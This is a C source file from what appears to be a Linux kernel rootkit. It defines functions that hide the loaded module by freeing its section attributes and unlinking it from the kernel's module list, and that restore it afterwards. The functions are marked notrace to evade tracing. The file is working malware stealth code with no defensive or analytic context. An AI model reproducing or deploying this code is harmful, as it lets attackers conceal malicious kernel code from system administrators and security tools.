#include <linux/module.h>
#include <linux/slab.h>

#include "config.h"
#include "evasion.h"
#include "htm.h"

static char _hidden = 0;
static struct list_head *mod_list_head;

notrace int htm_hide_module(void)
{
	if (_hidden) {
		#ifdef HTM_DEBUG
		htm_pr_warn("module already hidden");
		#endif
		return -EINVAL;
	}

	if (THIS_MODULE->sect_attrs) {
		kfree(THIS_MODULE->sect_attrs);
		THIS_MODULE->sect_attrs = NULL;
	}

	mod_list_head = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	#ifdef HTM_DEBUG
	htm_pr_notice("module hidden");
	#endif

	_hidden = 1;

	return 0;
}

notrace int htm_show_module(void)
{
	if (! _hidden) {
		#ifdef HTM_DEBUG
		htm_pr_warn("module already exposed");
		#endif
		return -EINVAL;
	}

	list_add(&THIS_MODULE->list, mod_list_head);

	#ifdef HTM_DEBUG
	htm_pr_notice("module exposed");
	#endif

	_hidden = 0;

	return 0;
}
